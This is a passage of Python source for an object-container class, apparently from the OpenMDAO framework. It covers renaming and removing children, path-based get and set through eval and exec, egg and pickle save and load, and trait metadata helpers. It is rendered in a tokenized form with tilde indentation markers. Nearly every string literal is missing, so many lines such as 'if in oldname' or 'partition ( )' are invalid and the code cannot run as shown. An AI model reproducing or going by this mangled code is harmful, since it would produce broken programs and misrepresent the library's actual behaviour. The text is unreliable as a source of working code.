~~~ allowed_hosts . append ( ) \n 
~~ ~~ else : \n 
~~~ address = None \n 
allowed_hosts = None \n 
\n 
~~ name = self . name or \n 
access = addr if addr_type == else addr_type \n 
name = % ( name , access ) \n 
manager = ObjectManager ( self , address , authkey = proxy . _authkey , \n 
name = name , allowed_hosts = allowed_hosts ) \n 
self . _managers [ key ] = manager \n 
~~ return manager . proxy \n 
\n 
~~ def _check_rename ( self , oldname , newname ) : \n 
~~~ if in oldname or in newname : \n 
~~~ self . raise_exception ( "can\'t rename \'%s\' to \'%s\': rename only works" \n 
" within a single scope." % \n 
( oldname , newname ) , RuntimeError ) \n 
~~ if not self . contains ( oldname ) : \n 
~~~ self . raise_exception ( "can\'t rename \'%s\' to \'%s\': \'%s\' was not found." % \n 
( oldname , newname , oldname ) , RuntimeError ) \n 
~~ if self . contains ( newname ) : \n 
~~~ self . raise_exception ( "can\'t rename \'%s\' to \'%s\': \'%s\' already exists." % \n 
( oldname , newname , newname ) , RuntimeError ) \n 
\n 
~~ ~~ def rename ( self , oldname , newname ) : \n 
~~~ """Renames a child of this object from oldname to newname.""" \n 
self . _check_rename ( oldname , newname ) \n 
obj = self . remove ( oldname ) \n 
self . add ( newname , obj ) \n 
\n 
~~ def remove ( self , name ) : \n 
~~~ """Remove the specified child from this container and remove any\n        public trait objects that reference that child. Notify any\n        observers.\n        """ \n 
if in name : \n 
~~~ self . raise_exception ( \n 
% \n 
name , NameError ) \n 
~~ try : \n 
~~~ obj = getattr ( self , name ) \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
~~ trait = self . get_trait ( name ) \n 
if trait is None : \n 
~~~ delattr ( self , name ) \n 
~~ else : \n 
\n 
# the trait \n 
~~~ if trait . is_trait_type ( Slot ) : \n 
~~~ try : \n 
~~~ setattr ( self , name , None ) \n 
~~ except TypeError as err : \n 
~~~ self . raise_exception ( str ( err ) , RuntimeError ) \n 
~~ ~~ else : \n 
~~~ self . remove_trait ( name ) \n 
\n 
~~ ~~ return obj \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def configure ( self ) : \n 
~~~ pass \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def copy ( self ) : \n 
~~~ """Returns a deep copy without deepcopying the parent.\n        """ \n 
cp = copy . deepcopy ( self ) \n 
cp . _relink ( ) \n 
return cp \n 
\n 
~~ def _relink ( self ) : \n 
~~~ """Restore parent links in copy.""" \n 
for name in self . list_containers ( ) : \n 
~~~ container = getattr ( self , name ) \n 
if container is not self . _parent : \n 
~~~ container . _parent = self \n 
container . _relink ( ) \n 
\n 
~~ ~~ ~~ @ rbac ( ( , ) ) \n 
def cpath_updated ( self ) : \n 
~~~ """Called after the hierarchy containing this Container has been\n        defined back to the root. This does not guarantee that all sibling\n        Containers have been defined. It also does not guarantee that this\n        component is fully configured to execute. Classes that override this\n        function must call their base class version.\n\n        This version calls cpath_updated() on all of its child Containers.\n        """ \n 
self . _fix_loggers ( self , recurse = False ) \n 
self . _call_cpath_updated = False \n 
for cont in self . list_containers ( ) : \n 
~~~ cont = getattr ( self , cont ) \n 
if cont is not self . _parent : \n 
~~~ cont . cpath_updated ( ) \n 
\n 
~~ ~~ ~~ def revert_to_defaults ( self , recurse = True ) : \n 
~~~ """Sets the values of all of the inputs to their default values.""" \n 
self . reset_traits ( iotype = ) \n 
if recurse : \n 
~~~ for cname in self . list_containers ( ) : \n 
~~~ getattr ( self , cname ) . revert_to_defaults ( recurse ) \n 
\n 
~~ ~~ ~~ def _items ( self , visited , recurse = False , ** metadata ) : \n 
~~~ """Return an iterator that returns a list of tuples of the form\n        (rel_pathname, obj) for each trait of this Container that matches\n        the given metadata. If recurse is True, also iterate through all\n        child Containers of each Container found.\n        """ \n 
if id ( self ) not in visited : \n 
~~~ visited . add ( id ( self ) ) \n 
match_dict = self . _alltraits ( ** metadata ) \n 
\n 
if recurse : \n 
~~~ for name in self . list_containers ( ) : \n 
~~~ obj = getattr ( self , name ) \n 
if name in match_dict and id ( obj ) not in visited : \n 
~~~ yield ( name , obj ) \n 
~~ if obj : \n 
~~~ for chname , child in obj . _items ( visited , recurse , \n 
** metadata ) : \n 
~~~ yield ( . join ( ( name , chname ) ) , child ) \n 
\n 
~~ ~~ ~~ ~~ for name , trait in match_dict . items ( ) : \n 
~~~ obj = getattr ( self , name , Missing ) \n 
# In some components with complex loading behavior (like \n 
# NPSSComponent), we can have a temporary situation during \n 
\n 
\n 
# anything. \n 
if obj is not Missing : \n 
~~~ if is_instance ( obj , ( Container , VarTree ) ) and id ( obj ) not in visited : \n 
~~~ if not recurse : \n 
~~~ yield ( name , obj ) \n 
~~ ~~ elif trait . iotype is not None : \n 
~~~ yield ( name , obj ) \n 
\n 
~~ ~~ ~~ ~~ ~~ def items ( self , recurse = False , ** metadata ) : \n 
~~~ """Return a list of tuples of the form (rel_pathname, obj) for each\n        trait of this Container that matches the given metadata. If recurse is\n        True, also iterate through all child Containers of each Container\n        found.\n        """ \n 
return self . _items ( set ( [ id ( self . parent ) ] ) , recurse , ** metadata ) \n 
\n 
~~ def list_containers ( self ) : \n 
~~~ """Return a list of names of child Containers.""" \n 
return [ n for n , v in self . items ( ) if is_instance ( v , Container ) ] \n 
\n 
~~ def list_vars ( self ) : \n 
~~~ """Return a list of Variables in this Container.""" \n 
return [ k for k , v in self . items ( iotype = not_none ) ] \n 
\n 
\n 
~~ @ rbac ( ( , ) ) \n 
def _alltraits ( self , traits = None , events = False , ** metadata ) : \n 
~~~ """This returns a dict that contains traits (class and instance)\n        that match the given metadata.  If the \'traits\' argument is not\n        None, then it is assumed to be the dict of traits to be filtered.\n        """ \n 
if traits is None : \n 
~~~ if self . _cached_traits_ : \n 
~~~ traits = self . _cached_traits_ \n 
~~ else : \n 
~~~ traits = self . traits ( ) \n 
traits . update ( self . _instance_traits ( ) ) \n 
self . _cached_traits_ = traits \n 
\n 
~~ ~~ result = { } \n 
for name , trait in traits . items ( ) : \n 
~~~ if not events and trait . type is : \n 
~~~ continue \n 
~~ for meta_name , meta_eval in metadata . items ( ) : \n 
~~~ if type ( meta_eval ) is FunctionType : \n 
~~~ if not meta_eval ( getattr ( trait , meta_name ) ) : \n 
~~~ break \n 
~~ ~~ elif meta_eval != getattr ( trait , meta_name ) : \n 
~~~ break \n 
~~ ~~ else : \n 
~~~ result [ name ] = trait \n 
\n 
~~ ~~ return result \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def contains ( self , path ) : \n 
~~~ """Return True if the child specified by the given dotted path\n        name is contained in this Container.\n        """ \n 
childname , _ , restofpath = path . partition ( ) \n 
if restofpath : \n 
~~~ obj = getattr ( self , childname , Missing ) \n 
if obj is Missing : \n 
~~~ return False \n 
~~ elif is_instance ( obj , Container ) : \n 
~~~ return obj . contains ( restofpath ) \n 
~~ else : \n 
~~~ return hasattr ( obj , restofpath ) \n 
~~ ~~ return hasattr ( self , path ) \n 
\n 
~~ def _get_metadata_failed ( self , traitpath , metaname ) : \n 
~~~ self . raise_exception ( "Couldn\'t find metadata for trait %s" % traitpath , \n 
AttributeError ) \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def get_metadata ( self , traitpath , metaname = None ) : \n 
~~~ """Retrieve the metadata associated with the trait found using\n        traitpath.  If metaname is None, return the entire metadata dictionary\n        for the specified trait. Otherwise, just return the specified piece\n        of metadata.  If the specified piece of metadata is not part of\n        the trait, None is returned.\n        """ \n 
childname , _ , restofpath = traitpath . partition ( ) \n 
if restofpath : \n 
~~~ obj = getattr ( self , childname , Missing ) \n 
if obj is Missing : \n 
~~~ return self . _get_metadata_failed ( traitpath , metaname ) \n 
~~ elif hasattr ( obj , ) : \n 
~~~ return obj . get_metadata ( restofpath , metaname ) \n 
~~ else : \n 
\n 
# data object, then we can assume that the iotype of the \n 
# attribute is the same as the iotype of the Variable. \n 
~~~ t = self . get_trait ( childname ) \n 
if t is not None and t . iotype and metaname == : \n 
~~~ return t . iotype \n 
~~ else : \n 
~~~ self . _get_metadata_failed ( traitpath , metaname ) \n 
\n 
~~ ~~ ~~ varname , _ , _ = traitpath . partition ( ) \n 
try : \n 
~~~ mdict = self . _trait_metadata [ varname ] \n 
~~ except KeyError : \n 
~~~ t = self . get_trait ( varname ) \n 
if t : \n 
~~~ t = t . trait_type \n 
mdict = t . _metadata . copy ( ) \n 
\n 
\n 
\n 
mdict . setdefault ( , t . __class__ . __name__ ) \n 
~~ else : \n 
~~~ mdict = self . _get_metadata_failed ( traitpath , None ) \n 
~~ self . _trait_metadata [ varname ] = mdict \n 
\n 
~~ if metaname is None : \n 
~~~ return mdict \n 
~~ else : \n 
~~~ return mdict . get ( metaname , None ) \n 
\n 
~~ ~~ @ rbac ( ( , ) ) \n 
def set_metadata ( self , traitpath , metaname , value ) : \n 
~~~ """Set the metadata associated with the trait found using traitpath.""" \n 
if metaname in ( , ) : \n 
~~~ self . raise_exception ( "Can\'t set %s on %s, read-only" \n 
% ( metaname , traitpath ) , TypeError ) \n 
~~ self . get_metadata ( traitpath ) [ metaname ] = value \n 
\n 
~~ @ rbac ( ( , ) , proxy_types = [ FileRef ] ) \n 
def get ( self , path ) : \n 
~~~ """Return the object specified by the given path, which may\n        contain \'.\' characters.\n        """ \n 
expr = self . _getcache . get ( path ) \n 
if expr is not None : \n 
~~~ return eval ( expr , self . __dict__ ) \n 
\n 
~~ obj , restofpath = get_closest_proxy ( self , path ) \n 
# if restofpath is truthy, it means either that path \n 
# contains a proxy or it contains some syntax that causes \n 
# getattr to fail, e.g., a function eval, array element ref, etc. \n 
if restofpath and IContainerProxy . providedBy ( obj ) : \n 
~~~ return obj . get ( restofpath ) \n 
\n 
# assume all local.  just compile the expr and cache it if \n 
# it can be evaluated \n 
~~ expr = compile ( path , path , mode = ) \n 
try : \n 
~~~ val = eval ( expr , self . __dict__ ) \n 
~~ except ( AttributeError , NameError ) as err : \n 
~~~ if not restofpath : # to get around issue with PassthroughProperty \n 
~~~ return obj \n 
~~ self . raise_exception ( str ( err ) , AttributeError ) \n 
~~ else : \n 
~~~ self . _getcache [ path ] = expr \n 
return val \n 
\n 
~~ ~~ @ rbac ( ( , ) , proxy_types = [ FileRef ] ) \n 
def get_flattened_value ( self , path ) : \n 
~~~ """Return the named value, which may include\n        an array index, as a flattened array of floats.  If\n        the value is not flattenable into an array of floats,\n        raise a TypeError.\n        """ \n 
return flattened_value ( path , self . get ( path ) ) \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def set_flattened_value ( self , path , value ) : \n 
~~~ obj , restofpath = proxy_parent ( self , path ) \n 
# if restofpath is truthy, it means either that path \n 
# contains a proxy or it contains some syntax that causes \n 
# getattr to fail, e.g., a function eval, array element ref, etc. \n 
if restofpath and IContainerProxy . providedBy ( obj ) : \n 
~~~ obj . set_flattened_value ( restofpath , value ) \n 
return \n 
\n 
# get current value \n 
~~ val = self . get ( path ) \n 
if not isinstance ( val , int_types ) and isinstance ( val , complex_or_real_types ) : \n 
~~~ self . set ( path , value [ 0 ] ) \n 
return \n 
~~ elif hasattr ( val , ) : \n 
~~~ val . set_flattened_value ( value ) \n 
return \n 
~~ elif isinstance ( val , ndarray ) : \n 
~~~ try : \n 
~~~ newshape = value . shape \n 
self . set ( path , value . reshape ( val . shape ) ) \n 
~~ except Exception as err : \n 
~~~ self . reraise_exception ( "ERROR setting value \'%s.%s\' shape: %s to shape %s" \n 
% ( self . get_pathname ( ) , path , val . shape , newshape ) , \n 
sys . exc_info ( ) ) \n 
~~ return \n 
\n 
# now get the non-indexed value and the index \n 
~~ val = self . get ( path . split ( , 1 ) [ 0 ] ) \n 
idx = get_index ( path ) \n 
\n 
if isinstance ( val , int_types ) : \n 
~~~ pass # fall through to exception \n 
~~ elif hasattr ( val , ) and idx is not None : \n 
~~~ if isinstance ( val [ idx ] , complex_or_real_types ) : \n 
~~~ val [ idx ] = value [ 0 ] \n 
~~ else : \n 
~~~ val [ idx ] = value \n 
~~ return \n 
~~ elif IVariableTree . providedBy ( val ) : \n 
~~~ raise NotImplementedError ( "no support for setting flattened values into vartrees" ) \n 
~~ elif hasattr ( val , ) : \n 
~~~ val . set_flattened_value ( value ) \n 
return \n 
\n 
~~ self . raise_exception ( "Failed to set flattened value to variable %s" % path , TypeError ) \n 
\n 
~~ def get_iotype ( self , name ) : \n 
~~~ return self . get_trait ( name ) . iotype \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def set ( self , path , value ) : \n 
~~~ """Set the value of the Variable specified by the given path, which\n        may contain \'.\' characters. The Variable will be set to the given\n        value, subject to validation and constraints.\n        """ \n 
_local_setter_ = value \n 
expr = self . _setcache . get ( path ) \n 
if expr is not None : \n 
~~~ exec ( expr ) \n 
return \n 
\n 
~~ obj , restofpath = proxy_parent ( self , path ) \n 
# if restofpath is truthy, it means either that path \n 
# contains a proxy or it contains some syntax that causes \n 
# getattr to fail, e.g., a function eval, array element ref, etc. \n 
\n 
if IOverrideSet . providedBy ( obj ) or ( restofpath and IContainerProxy . providedBy ( obj ) ) : \n 
~~~ obj . set ( restofpath , value ) \n 
return \n 
\n 
# assume all local.  just compile the expr and cache it if \n 
# it can be evaluated \n 
~~ assign = "self.%s=_local_setter_" % path \n 
expr = compile ( assign , assign , mode = ) \n 
try : \n 
~~~ exec ( expr ) \n 
~~ except Exception as err : \n 
~~~ self . raise_exception ( str ( err ) , err . __class__ ) \n 
~~ else : \n 
~~~ self . _setcache [ path ] = expr \n 
\n 
~~ ~~ def save_to_egg ( self , name , version , py_dir = None , src_dir = None , \n 
src_files = None , child_objs = None , dst_dir = None , \n 
observer = None , need_requirements = True ) : \n 
~~~ """Save state and other files to an egg.  Typically used to copy all or\n        part of a simulation to another user or machine.  By specifying child\n        containers in `child_objs`, it will be possible to create instances of\n        just those containers from the installed egg.  Child container names\n        should be specified relative to this container.\n\n        name: string\n            Name for egg; must be an alphanumeric string.\n\n        version: string\n            Version for egg; must be an alphanumeric string.\n\n        py_dir: string\n            The (root) directory for local Python files. It defaults to\n            the current directory.\n\n        src_dir: string\n            The root of all (relative) `src_files`.\n\n        src_files: list\n            List of paths to files to be included in the egg.\n\n        child_objs: list\n            List of child objects for additional entry points.\n\n        dst_dir: string\n            The directory to write the egg in.\n\n        observer: callable\n            Will be called via an :class:`EggObserver`.\n\n        need_requirements: bool\n            Passed to :meth:`eggsaver.save_to_egg`.\n\n        After collecting entry point information, calls\n        :meth:`eggsaver.save_to_egg`.\n        Returns ``(egg_filename, required_distributions, orphan_modules)``.\n        """ \n 
assert name and isinstance ( name , basestring ) \n 
assert version and isinstance ( version , basestring ) \n 
if not version . endswith ( ) : \n 
~~~ version += \n 
~~ now = datetime . datetime . now ( ) # Could consider using utcnow(). \n 
tstamp = % ( now . year , now . month , now . day , now . hour , now . minute ) \n 
version += tstamp \n 
\n 
observer = eggobserver . EggObserver ( observer , self . _logger ) \n 
\n 
# Child entry point names are the pathname, starting at self. \n 
entry_pts = [ ( self , name , _get_entry_group ( self ) ) ] \n 
if child_objs is not None : \n 
~~~ root_pathname = self . get_pathname ( ) \n 
root_start = root_pathname . rfind ( ) \n 
root_start = root_start + 1 if root_start >= 0 else 0 \n 
root_pathname += \n 
for child in child_objs : \n 
~~~ pathname = child . get_pathname ( ) \n 
if not pathname . startswith ( root_pathname ) : \n 
~~~ msg = % ( pathname , root_pathname ) \n 
observer . exception ( msg ) \n 
self . raise_exception ( msg , RuntimeError ) \n 
~~ entry_pts . append ( ( child , pathname [ root_start : ] , \n 
_get_entry_group ( child ) ) ) \n 
\n 
~~ ~~ parent = self . parent \n 
self . parent = None \n 
try : \n 
~~~ return eggsaver . save_to_egg ( entry_pts , version , py_dir , \n 
src_dir , src_files , dst_dir , \n 
self . _logger , observer . observer , \n 
need_requirements ) \n 
~~ except Exception : \n 
~~~ self . reraise_exception ( info = sys . exc_info ( ) ) # Just to get a pathname. \n 
~~ finally : \n 
~~~ self . parent = parent \n 
\n 
~~ ~~ def save ( self , outstream , fmt = SAVE_CPICKLE , proto = - 1 ) : \n 
~~~ """Save the state of this object and its children to the given\n        output stream. Pure Python classes generally won\'t need to\n        override this because the base class version will suffice, but\n        Python extension classes will have to override. The format\n        can be supplied in case something other than cPickle is needed.\n\n        outstream: file or string\n            Stream to save to.\n\n        fmt: int\n            Format for saved data.\n\n        proto: int\n            Protocol used.\n        """ \n 
parent = self . parent \n 
self . parent = None \n 
try : \n 
~~~ eggsaver . save ( self , outstream , fmt , proto , self . _logger ) \n 
~~ except Exception : \n 
~~~ self . reraise_exception ( info = sys . exc_info ( ) ) # Just to get a pathname. \n 
~~ finally : \n 
~~~ self . parent = parent \n 
\n 
~~ ~~ @ staticmethod \n 
def load_from_eggfile ( filename , observer = None , log = None ) : \n 
~~~ """Extract files in egg to a subdirectory matching the saved object\n        name and then load object graph state.\n\n        filename: string\n            Name of egg file to be loaded.\n\n        observer: callable\n            Will be called via an :class:`EggObserver`.\n\n        log: :class:`logging.Logger`\n            Used for logging progress, default is root logger.\n\n        Returns the root object.\n        """ \n 
# Load from file gets everything. \n 
entry_group = \n 
entry_name = \n 
log = log or logger \n 
return eggloader . load_from_eggfile ( filename , entry_group , entry_name , \n 
log , observer ) \n 
\n 
~~ @ staticmethod \n 
def load_from_eggpkg ( package , entry_name = None , instance_name = None , \n 
observer = None ) : \n 
~~~ """Load object graph state by invoking the given package entry point.\n        If specified, the root object is renamed to `instance_name`.\n\n        package: string\n            Package name.\n\n        entry_name: string\n            Name of entry point.\n\n        instance_name: string\n            Name for root object.\n\n        observer: callable\n            Will be called via an :class:`EggObserver`.\n\n        Returns the root object.\n        """ \n 
entry_group = \n 
if not entry_name : \n 
~~~ entry_name = package # Default component is top. \n 
~~ return eggloader . load_from_eggpkg ( package , entry_group , entry_name , \n 
instance_name , logger , observer ) \n 
\n 
~~ @ staticmethod \n 
def load ( instream , fmt = SAVE_CPICKLE , package = None , call_post_load = True , \n 
name = None ) : \n 
~~~ """Load object(s) from the input stream. Pure Python classes generally\n        won\'t need to override this, but extensions will. The format can be\n        supplied in case something other than cPickle is needed.\n\n        instream: file or string\n            Stream to load from.\n\n        fmt: int\n            Format of state data.\n\n        package: string\n            Name of package to look for `instream`, if `instream` is a string\n            that is not an existing file.\n\n        call_post_load: bool\n            If True, call :meth:`post_load`.\n\n        name: string\n            Name for root object.\n\n        Returns the root object.\n        """ \n 
top = eggloader . load ( instream , fmt , package , logger ) \n 
top . cpath_updated ( ) \n 
if name : \n 
~~~ top . name = name \n 
~~ if call_post_load : \n 
~~~ top . parent = None \n 
top . post_load ( ) \n 
~~ return top \n 
\n 
~~ def post_load ( self ) : \n 
~~~ """Perform any required operations after the model has been loaded.\n        At this point the local configuration of the Component is valid,\n        but \'remote\' traits may need \'repairing\' which can\'t be done until\n        the remote environment is ready. Components with remote environments\n        should override this and restore the remote environment first, then\n        call the superclass.\n        """ \n 
self . _repair_traits ( ) \n 
for name in self . list_containers ( ) : \n 
~~~ getattr ( self , name ) . post_load ( ) \n 
\n 
~~ ~~ @ rbac ( ) \n 
def pre_delete ( self ) : \n 
~~~ """Perform any required operations before the model is deleted.""" \n 
for name in self . list_containers ( ) : \n 
~~~ getattr ( self , name ) . pre_delete ( ) \n 
\n 
~~ ~~ @ rbac ( ( , ) , proxy_types = [ CTrait ] ) \n 
def get_dyn_trait ( self , pathname , iotype = None , trait = None ) : \n 
~~~ """Returns a trait if a trait with the given pathname exists, possibly\n        creating it "on-the-fly" and adding its Container. If an attribute exists\n        with the given pathname but no trait is found or can be created, or if\n        pathname references a trait in a parent scope, None will be returned.\n        If no attribute exists with the given pathname within this scope, an\n        AttributeError will be raised.\n\n        pathname: str\n            Pathname of the desired trait.  May contain dots.\n\n        iotype: str (optional)\n            Expected iotype of the trait.\n\n        trait: TraitType (optional)\n            Trait to be used for validation.\n        """ \n 
if pathname . startswith ( ) : \n 
~~~ return None \n 
~~ cname , _ , restofpath = pathname . partition ( ) \n 
if restofpath : \n 
~~~ child = getattr ( self , cname ) \n 
if is_instance ( child , Container ) : \n 
~~~ return child . get_dyn_trait ( restofpath , iotype , trait ) \n 
~~ else : \n 
~~~ if deep_hasattr ( child , restofpath ) : \n 
~~~ return None \n 
~~ ~~ ~~ else : \n 
~~~ trait = self . get_trait ( cname ) \n 
if trait is not None : \n 
~~~ if iotype is not None : \n 
~~~ if isinstance ( trait . trait_type , Python ) : # VariableTree \n 
~~~ obj = getattr ( self , cname ) \n 
t_iotype = getattr ( obj , , None ) \n 
~~ else : # Variable \n 
~~~ t_iotype = self . get_iotype ( cname ) \n 
~~ if ( iotype == and t_iotype not in ( , ) ) or ( iotype == and t_iotype not in ( , , , ) ) : \n 
~~~ self . raise_exception ( "\'%s\' must be an %s variable" % \n 
( pathname , _iodict [ iotype ] ) , \n 
RuntimeError ) \n 
~~ ~~ return trait \n 
~~ elif trait is None and self . contains ( cname ) : \n 
~~~ return None \n 
\n 
~~ ~~ self . raise_exception ( "Cannot locate variable named \'%s\'" % \n 
pathname , AttributeError ) \n 
\n 
~~ @ rbac ( ( , ) ) \n 
def get_trait_typenames ( self , pathname , iotype = None ) : \n 
~~~ """Return names of the \'final\' type (bypassing passthrough traits)\n        for `pathname` using :meth:`get_dyn_trait`. Used by dynamic wrappers\n        to determine the type of variable to wrap. The returned list is a\n        depth-first traversal of the class hierarchy.\n\n        pathname: str\n            Pathname of the desired trait. May contain dots.\n\n        iotype: str (optional)\n            Expected iotype of the trait.\n        """ \n 
if not pathname : \n 
~~~ obj = self \n 
~~ else : \n 
~~~ trait = self . get_dyn_trait ( pathname , iotype = iotype ) \n 
if trait is None : \n 
~~~ return [ ] \n 
\n 
~~ trait = trait . trait_type or trait . trait or trait \n 
if trait . target : # PassthroughTrait, PassthroughProperty \n 
~~~ trait = self . get_dyn_trait ( trait . target ) \n 
try : \n 
~~~ ttype = trait . trait_type \n 
~~ except AttributeError : \n 
~~~ pass \n 
~~ else : \n 
~~~ if ttype is not None : \n 
~~~ trait = ttype \n 
\n 
~~ ~~ ~~ if isinstance ( trait , Python ) : # Container \n 
~~~ obj = self . get ( pathname ) \n 
~~ else : # Variable \n 
~~~ obj = trait \n 
\n 
~~ ~~ names = [ ] \n 
Container . _bases ( type ( obj ) , names ) \n 
return names \n 
\n 
~~ @ staticmethod \n 
def _bases ( cls , names ) : \n 
~~~ """ Helper for :meth:`get_trait_typenames`. """ \n 
names . append ( % ( cls . __module__ , cls . __name__ ) ) \n 
for base in cls . __bases__ : \n 
~~~ Container . _bases ( base , names ) \n 
\n 
~~ ~~ def raise_exception ( self , msg , exception_class = Exception ) : \n 
~~~ """Raise an exception.""" \n 
coords = \n 
obj = self \n 
while obj is not None : \n 
~~~ try : \n 
~~~ coords = obj . get_itername ( ) \n 
~~ except AttributeError : \n 
~~~ try : \n 
~~~ obj = obj . parent \n 
~~ except AttributeError : \n 
~~~ break \n 
~~ ~~ else : \n 
~~~ break \n 
~~ ~~ if coords : \n 
~~~ full_msg = % ( self . get_pathname ( ) , coords , msg ) \n 
~~ else : \n 
~~~ full_msg = % ( self . get_pathname ( ) , msg ) \n 
#self._logger.error(msg) \n 
~~ raise exception_class ( full_msg ) \n 
\n 
~~ def reraise_exception ( self , msg = , info = None ) : \n 
~~~ """Re-raise an exception with updated message and original traceback.""" \n 
if info is None : \n 
~~~ exc_type , exc_value , exc_traceback = sys . exc_info ( ) \n 
~~ else : \n 
~~~ exc_type , exc_value , exc_traceback = info \n 
\n 
~~ if msg : \n 
~~~ msg = % ( msg , exc_value ) \n 
~~ else : \n 
~~~ msg = % exc_value \n 
\n 
~~ prefix = % self . get_pathname ( ) \n 
\n 
if not msg . startswith ( prefix ) : \n 
~~~ msg = prefix + msg \n 
\n 
~~ new_exc = exc_type ( msg ) \n 
\n 
raise exc_type , new_exc , exc_traceback \n 
\n 
~~ def build_trait ( self , ref_name , iotype = None , trait = None ) : \n 
~~~ """Build a trait referring to `ref_name`.\n        This is called by :meth:`create_io_traits`.\n        This must be overridden.\n\n        iotype: str or dict\n            If `iotype` is a string it specifies the trait\'s iotype.\n            If it\'s a dictionary, it provides metadata.\n\n        trait: Trait\n            If `trait` is not None, use that trait rather than building one.\n        """ \n 
self . raise_exception ( , NotImplementedError ) \n 
\n 
\n 
# By default we always proxy Containers and FileRefs. \n 
~~ ~~ CLASSES_TO_PROXY . append ( Container ) \n 
CLASSES_TO_PROXY . append ( FileRef ) \n 
\n 
\n 
# Some utility functions \n 
\n 
\n 
def _get_entry_group ( obj ) : \n 
~~~ """Return entry point group for given object type.""" \n 
if _get_entry_group . group_map is None : \n 
# Fill-in here to avoid import loop. \n 
~~~ from openmdao . main . component import Component \n 
from openmdao . main . driver import Driver \n 
\n 
# Entry point definitions taken from plugin-guide. \n 
# Order should be from most-specific to least. \n 
_get_entry_group . group_map = [ \n 
( Variable , ) , \n 
( Driver , ) , \n 
( ICaseIterator , ) , \n 
( IResourceAllocator , ) , \n 
( Component , ) , \n 
( Container , ) , \n 
] \n 
\n 
~~ for cls , group in _get_entry_group . group_map : \n 
~~~ if issubclass ( cls , Interface ) : \n 
~~~ if cls . providedBy ( obj ) : \n 
~~~ return group \n 
~~ ~~ else : \n 
~~~ if isinstance ( obj , cls ) : \n 
~~~ return group \n 
~~ ~~ ~~ return None \n 
\n 
~~ _get_entry_group . group_map = None # Map from class/interface to group name. \n 
\n 
\n 
def dump ( cont , recurse = False , stream = None , ** metadata ) : \n 
~~~ """Print all items having specified metadata and\n    their corresponding values to the given stream. If the stream\n    is not supplied, it defaults to *sys.stdout*.\n    """ \n 
pprint . pprint ( dict ( [ ( n , str ( v ) ) \n 
for n , v in cont . items ( recurse = recurse , \n 
** metadata ) ] ) , \n 
stream ) \n 
\n 
\n 
~~ def find_name ( parent , obj ) : \n 
~~~ """Find the given object in the specified parent and return its name\n    in the parent\'s `__dict__`.  There could be multiple names bound to a\n    given object. Only the first name found is returned.\n\n    Return \'\' if not found.\n    """ \n 
for name , val in parent . __dict__ . items ( ) : \n 
~~~ if val is obj : \n 
~~~ return name \n 
~~ ~~ return \n 
\n 
\n 
~~ def get_default_name ( obj , scope ) : \n 
~~~ """Return a unique name for the given object in the given scope.""" \n 
classname = obj . __class__ . __name__ . lower ( ) \n 
if scope is None : \n 
~~~ sdict = { } \n 
~~ else : \n 
~~~ sdict = scope . __dict__ \n 
\n 
~~ ver = 1 \n 
while % ( classname , ver ) in sdict : \n 
~~~ ver += 1 \n 
~~ return % ( classname , ver ) \n 
\n 
\n 
~~ def find_trait_and_value ( obj , pathname ) : \n 
~~~ """Return a tuple of the form (trait, value) for the given dotted\n    pathname. Raises an exception if the value indicated by the pathname\n    is not found in obj. If the value is found but has no trait, then\n    (None, value) is returned.\n    """ \n 
names = pathname . split ( ) \n 
for name in names [ : - 1 ] : \n 
~~~ obj = getattr ( obj , name ) \n 
~~ if is_instance ( obj , Container ) : \n 
~~~ objtrait = obj . get_trait ( names [ - 1 ] ) \n 
~~ elif isinstance ( obj , HasTraits ) : \n 
~~~ objtrait = obj . trait ( names [ - 1 ] ) \n 
~~ else : \n 
~~~ objtrait = None \n 
~~ return ( objtrait , getattr ( obj , names [ - 1 ] ) ) \n 
\n 
\n 
~~ def create_io_traits ( cont , obj_info , iotype = ) : \n 
~~~ """Create io trait(s) specified by the contents of `obj_info`. Calls\n    :meth:`build_trait` on :class:`Container` `cont`, which can be overridden\n    by subclasses, to create each trait.  One use of this is to provide traits\n    mapping to variables inside a :class:`Component` implemented as a Python\n    extension module.\n\n    `obj_info` is assumed to be either a string, a tuple, or a list\n    that contains strings and/or tuples.  The information is used to specify\n    the "internal" and "external" names of the variable.\n    The "internal" name uses the naming scheme within the Container.\n    The "external" name is the one that will be used to access the trait\n    from outside the Container; it must not contain any \'.\' characters.\n\n    A string specifies the "internal" name for the variable.  The "external"\n    name will be the "internal" name with any \'.\' characters replaced by \'_\'.\n\n    Tuples must contain the "internal" name followed by the "external" name\n    and may optionally contain an iotype and a validation trait. If the iotype\n    is a dictionary rather than a string, it is used for trait metadata (it may\n    include the ``iotype`` key but does not have to).\n\n    `iotype` is the default I/O type to be used.\n\n    The newly created traits are added to the specified Container.\n\n    For example, the following are valid calls::\n\n        # Create an input trait \'foo\' referring to \'foo\' on \'obj\'.\n        create_io_traits(obj, \'foo\')\n\n        # Create an input trait \'inputs_foo\' referring to \'inputs.foo\'.\n        create_io_traits(obj, \'inputs.foo\')\n\n        # Create outputs \'foo\', \'bar\', and \'baz\'.\n        create_io_traits(obj, [\'foo\',\'bar\',\'baz\'], iotype=\'out\')\n\n        # Use Bool trait named \'foo_alias\' to refer to \'foo\', and create \'bar\'.\n        create_io_traits(obj, (\'foo\', \'foo_alias\', \'in\', Bool()), \'bar\')\n\n        # Create inputs \'fooa\' and \'bazz\', and output \'barb\'.\n        # \'fooa\' will have the specified metadata.\n        create_io_traits(obj, [(\'foo\', \'fooa\', {low=-1, high=10}),\n                               (\'bar\', \'barb\', \'out\'),\n                               (\'baz\', \'bazz\')])\n\n    """ \n 
if isinstance ( obj_info , ( basestring , tuple ) ) : \n 
~~~ it = [ obj_info ] \n 
~~ else : \n 
~~~ it = obj_info \n 
\n 
~~ for entry in it : \n 
~~~ iostat = iotype \n 
trait = None \n 
\n 
if isinstance ( entry , basestring ) : \n 
~~~ ref_name = entry \n 
name = entry . replace ( , ) \n 
~~ elif isinstance ( entry , tuple ) : \n 
~~~ ref_name = entry [ 0 ] # internal name \n 
name = entry [ 1 ] or ref_name . replace ( , ) # wrapper name \n 
try : \n 
~~~ iostat = entry [ 2 ] # optional iotype/metadata \n 
trait = entry [ 3 ] # optional validation trait \n 
~~ except IndexError : \n 
~~~ pass \n 
~~ ~~ else : \n 
~~~ cont . raise_exception ( % entry , \n 
RuntimeError ) \n 
